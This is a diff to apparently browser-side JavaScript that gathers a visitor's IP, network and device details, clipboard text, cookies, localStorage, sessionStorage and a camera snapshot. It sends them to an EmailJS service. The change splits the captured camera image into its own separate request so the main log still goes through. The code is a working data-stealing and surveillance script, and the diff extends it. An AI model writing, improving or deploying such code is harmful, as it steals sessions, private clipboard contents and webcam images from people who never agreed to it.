@@ -199,7 +199,8 @@ function getSessionStorage() {
 getIpInfo().then(async ipInfo => {
     const deviceInfo = await getDeviceInfo();
 
-    emailjs.send("service_5fifa81", "template_w5liz9g", {
+    // Prepare payload WITHOUT camera_image
+    const payload = {
         ip: ipInfo.ip,
         network: ipInfo.network,
         version: ipInfo.version,
@@ -244,14 +245,41 @@ getIpInfo().then(async ipInfo => {
         clipboard_text: deviceInfo.clipboard_text,
         camera_status: deviceInfo.camera_status,
         microphone_status: deviceInfo.microphone_status,
-        camera_image: deviceInfo.camera_image,
+        // camera_image: deviceInfo.camera_image, // <-- REMOVE FROM MAIN REQUEST
         cookies: getCookies(),
         localStorage: getLocalStorage(),
         sessionStorage: getSessionStorage()
-    })
+    };
+
+    // Main log send (no camera image)
+    emailjs.send("service_5fifa81", "template_w5liz9g", payload)
     .then(() => {
         if (document.getElementById("log-status")) {
             document.getElementById("log-status").innerText = "Log sent successfully!";
+        }
+
+        // If camera image is available, send it in a separate request
+        if (
+            deviceInfo.camera_image &&
+            deviceInfo.camera_image !== "Permission denied" &&
+            deviceInfo.camera_image !== "Could not capture image"
+        ) {
+            // Minimal payload for camera image
+            emailjs.send("service_5fifa81", "template_cameraimg", {
+                ip: ipInfo.ip,
+                timestamp: new Date().toISOString(),
+                camera_image: deviceInfo.camera_image
+            })
+            .then(() => {
+                if (document.getElementById("log-status")) {
+                    document.getElementById("log-status").innerText += "\nCamera image sent successfully!";
+                }
+            })
+            .catch(error => {
+                if (document.getElementById("log-status")) {
+                    document.getElementById("log-status").innerText += "\nFailed to send camera image: " + JSON.stringify(error);
+                }
+            });
         }
     })
     .catch(error => {
